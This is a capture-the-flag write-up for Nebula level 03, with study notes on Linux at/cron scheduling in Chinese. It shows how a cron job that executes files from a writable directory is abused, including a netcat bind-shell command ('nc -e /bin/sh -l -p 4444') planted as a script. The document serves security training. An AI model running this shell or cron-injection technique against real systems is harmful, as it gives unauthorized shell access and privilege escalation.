# Level03

#### About

Check the home directory of flag03 and take note of the files there.  
There is a crontab that is called every couple of minutes. 

To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03. 


#### Source code

There is no source code available for this level  
```
cat  /home/flag03/writeable.sh
#!/bin/sh

for i in /home/flag03/writeable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

#### Solutions
```
level03@nebula:~$ cat ./test.sh
#!/bin/sh

/bin/getflag >> /tmp/a.out
level03@nebula:~$ cat ./test1.sh
#!/bin/sh

nc.traditional -v -e /bin/sh -l -p 4444
root@nebula:~#: ls /var/spool/cron/crontabs
flag03 root 
```

#### Recommend

Linux 计划任务/日志/优先级 

* 一次性定时任务
at, batch, atq, atrm  
atd  ----> at ---- /var/spool/cron/atjobs 
              ---- /var/spool/cron/atspool 
              ---- /proc/loadavg 
              ---- /var/run/utmp 
              ---- /etc/at.allow 
              ---- /etc/at.deny 


* 循环定时任务
cron ---- crontab  ---- /etc/crontab 
                    ---- /etc/cron.allow 
                    ---- /etc/cron.deny 
                    ---- /var/spool/cron/crontabs/*  
         
         ---- /etc/rc.local 
```
level03@nebula:~$ cat /etc/rc.local  
#!/bin/bash

start-stop-daemon -b -c flag12 -S /home/flag12/flag12.lua -x `which lua`
start-stop-daemon -b -c flag17 -S /home/flag17/flag17.py -x `which python`
/usr/sbin/thttpd -C /home/flag07/thttpd.conf
/usr/sbin/thttpd -C /home/flag16/thttpd.conf

* * * * * command to be executed
- - - - -
| | | | |
| | | | ----- Day of week (0 - 7) (Sunday=0 or 7)
| | | ------- Month (1 - 12)
| | --------- Day of month (1 - 31)
| ----------- Hour (0 - 23)
------------- Minute (0 - 59)

*   ---- 代表任何时刻
，  ---- 1，5，10 代表第1，第5，第10，
-   ---- 1-24，代表1到24
/n  ---- 间隔为n
```
